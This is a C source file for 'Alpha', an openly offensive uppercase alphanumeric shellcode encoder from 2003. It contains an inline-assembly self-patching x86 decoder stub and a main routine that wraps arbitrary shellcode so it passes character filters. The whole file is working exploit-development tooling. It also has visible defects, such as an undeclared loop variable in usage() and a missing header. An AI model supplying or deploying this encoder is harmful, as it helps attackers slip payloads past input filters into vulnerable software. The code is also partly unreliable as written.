#include <stdio.h>
#include <stdlib.h>

/*_____________________________________________________________________________
  
      ,sSSs,,s,  Alpha v0.2 beta.
     SS"  Y$P"   Captitalized alphanumeric shellcode encoder.
    iS'   dY     Copyright (C) 2003 by Berend-Jan Wever
    YS,  dSb     <skylined@edup.tudelft.nl>
    `"YSS'"S'    Encodes shellcode to contain only of 0-9, A-Z.
_____________________________________________________________________________*/

#define fake_getpc_options_count sizeof(fake_getpc_options)/ \
                                 sizeof(struct fake_getpc_options_struct)

struct fake_getpc_options_struct {
  char* option; // name of option
  char* opcode; // the code
  int enbedded_bytes; // how many bytes of the code will overwrite the decoder
} fake_getpc_options[] = {
  { "eax", "\x50", 1 }, // push %eax
  { "ebx", "\x53", 1 }, // push %ebx
  { "ecx", "\x51", 1 }, // push %ecx
  { "edx", "\x52", 1 }, // push %edx
  { "esp", "\x54", 1 }, // push %esp
  { "ebp", "\x55", 1 }, // push %ebp
  { "esi", "\x56", 1 }, // push %esi
  { "edi", "\x57", 1 }, // push %edi
  { "[esp]", "", 0 },    // nothing, just pop
  { "[esp-4]", "\x4c\x4c\x4c\x4c", 4 } //dec %esp(4x)
};

void alpha_decoder_source(void) {
  __asm__("
baseaddress:
# GetPC fake code -------------------------------------------------------------
      .byte '6','6','6','6','6'         # padding, can be overwritten.

      pop   %edx                        # %edx = baseaddress source

# Optimization #1, see docs below ---------------------------------------------
      .set  edx_decs, 4
      .set  bufferoffset, buffer-baseaddress+edx_decs
      dec   %edx
      dec   %edx
      dec   %edx
      dec   %edx

# Get a 0x0 in a register -----------------------------------------------------
      push  %esi                        # %esi = %eax = 0x0
      push  %esp
      pop   %eax
      xor   %ss:(%eax), %esi
      push  %esi
      pop   %eax

# XOR-patching ----------------------------------------------------------------
#     We are using a small, 1 byte offset added to the baseaddress to reach the
#     bytes we want to patch. We want to use '.set' variables for the offsets,
#     but the assembler will use the large, 4 byte offset if we do so.
#     I hard-coded the instruction to avoid this. (It sucks but it works).
      .set  xorcode1, 0x41
      .set  xorcode2, 0x3f

      xor   $xorcode1, %al              # %al = xorcode1
#     xor   %al, offset_0x10(%edx)      # decode 0x10 for imul instruction
      .byte 0x30, 0x42, byte_0x10-baseaddress+edx_decs

      dec   %eax                        # %al = xorcode2 (space saver ;)
      dec   %eax
#     xor   %al, offset_0x6b(%edx)      # decode 0x6b for imul instruction
      .byte 0x30, 0x42, byte_0x6b-baseaddress+edx_decs
#     xor   %al, offset_0x75(%edx)      # decode 0x75 for jne instruction
      .byte 0x30, 0x42, byte_0x75-baseaddress+edx_decs

# Decoder setup ---------------------------------------------------------------
      push  %edx
      pop   %ecx                        # %ecx = baseaddress destination

# Decode byte1 into lower nibble ----------------------------------------------
loop: push  %esi                        # %al = 0x0
      pop   %eax
#     xor   bufferoffset(%edx), %al     # %al = encoded data byte1
      .byte 0x32, 0x42, bufferoffset


      dec   %eax                        #   %al--                  (=byte1-1)
      xor   $0x41, %al                  #   %al ^=0x41             (=lownibble)
#      xor   bufferoffset(%ecx), %al          #   %al ^= *(destination)  (=lownibble^*(destination))
      .byte 0x32, 0x41, bufferoffset
#      xor   %al, bufferoffset(%ecx)          #   *(destination) ^= %al  (=lownibble)
      .byte 0x30, 0x41, bufferoffset

# Decode byte2 into upper nibble ----------------------------------------------
      inc   %edx
#      imul  $0x10, 0x42(%edx), %eax  # %al = highnibble * 0x10  (&0xff)
byte_0x6b:
      .byte 0x6b^xorcode2, 0x42, bufferoffset
byte_0x10:
      .byte 0x10^xorcode1
      inc   %edx
#      xor   %al, bufferoffset(%ecx) # *(destination) = ^%al    (lownibble+highnibble<<4)
      .byte 0x30, 0x41, bufferoffset

      inc   %ecx

# while loop, checks for terminating zero -------------------------------------
      push  %esi                     # > 0x0
      pop   %eax                     # < %eax = 0x0
      xor   $0x30, %al
#      xor   bufferoffset(%edx), %al          # terminating '0' ?
      .byte 0x32, 0x42, bufferoffset

      .set distance,      loop-end
      .set lownibble,     distance & 0xf
      .set byte1,         (lownibble ^ 0x41)+1
      .set highnibble,    (distance & 0xff) >> 4
      .set byte2,         highnibble + 0x40
#      jne   loop
byte_0x75:
      .byte 0x75^xorcode2
buffer:
      .byte byte1
end:
      .byte byte2

# '\0': end of shellcode string -----------------------------------------------
      .byte 0x0
  ");
}

void usage(char* name) {
  printf("\n______________________________________________________________________________"
         "\n"
         "\n    ,sSSs,,s,  Alpha v0.2 beta."
         "\n   SS\"  Y$P\"   Uppercase alphanumeric shellcode encoder."
         "\n  iS'   dY     Copyright (C) 2003 by Berend-Jan Wever"
         "\n  YS,  dSb     <skylined@edup.tudelft.nl>"
         "\n  `\"YSS'\"S'    Encodes shellcode to contain only of 0-9, A-Z."
         "\n______________________________________________________________________________"
         "\n"
         "\nUsage: %s [");
  for(i=0; i<fake_getpc_options_count; i++) {
    if (i>0) printf("|");
    printf(fake_getpc_options[i].option);
  }
  printf("]"
         "\n  Reads your shellcode from stdin and encodes it to contain only uppercase"
         "\n  alphanumeric characters. These include only 0-9 and A-Z. A decoder is put"
         "\n  before the encoded shellcode. The result is written to stdout."
         "\nOptions:"
         "\n  The decoder needs to know it's exact baseaddress, you can specify where"
         "\n  the shellcode will get it's baseaddress from. You can specify a register,"
         "\n  or a location on the stack."
         "\nDefault:"
         "\n  If you do not specify where the shellcode should gets it's baseaddress"
         "\n  from, it will pop it of the stack, this can be usefull if you want to put"
         "\n  your own GetPC code if front of it."
         "\n"
         "\nExample:"
         "\n  cat shellcode | alpha eax > shellcode_encoded"
         "\n  cat shellcode | alpha eax > shellcode_encoded"
         "\n"
         "\n", name);
}

int main(int argc, char* argv[]) {
  char* fake_getpc_code = "";
  char* decoder_code = (char*)alpha_decoder_source + 3;
  int i, j;
  int input, lownibble, highnibble, byte1, byte2;

  // Check for paramter count
  if (argc > 2) {
    usage(argv[0]);
    return -1;
  } else if (argc < 2) {
    // Default: no fake GetPC code.
  } else {
    // Read parameter and choose GetPC code
    for(i=0; i<fake_getpc_options_count; i++) {
      if (strcasecmp(argv[1], fake_getpc_options[i].option) == 0 ) {
        fake_getpc_code = fake_getpc_options[i].opcode;
        decoder_code += fake_getpc_options[i].enbedded_bytes;
        break;
      }
    }
    if (i == fake_getpc_options_count) {
      fprintf(stderr, "Error: unknown option '%s'", argv[1]);
      usage(argv[0]);
      return -1;
    }
  }

  // Check decoder for bad characters:
  for (i=0;i<strlen(decoder_code);i++)
    if (strchr("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ", decoder_code[i]) == (int)NULL) {
      fprintf(stderr, "Build error: The decoder contains bad characters!\n"
                      "byte #%d: 0x%02x\n", i, (unsigned int)decoder_code[i]);
      return -1;
    }

  // Output decoder:
  printf("%s%s", fake_getpc_code, decoder_code);

  // Output encoded shellcode:
  while ((input = getchar()) != EOF) {
    lownibble = (input & 0x0f);
    highnibble = (input & 0xf0) >> 4;
    byte1 = (lownibble ^ 0x41) + 1;
    byte2 = (highnibble == 0x0 ? 0x50 : highnibble+0x40);
    printf("%c%c", byte1, byte2);
  }
  // Output end of data marker:
  printf("0");
  return 0;
}
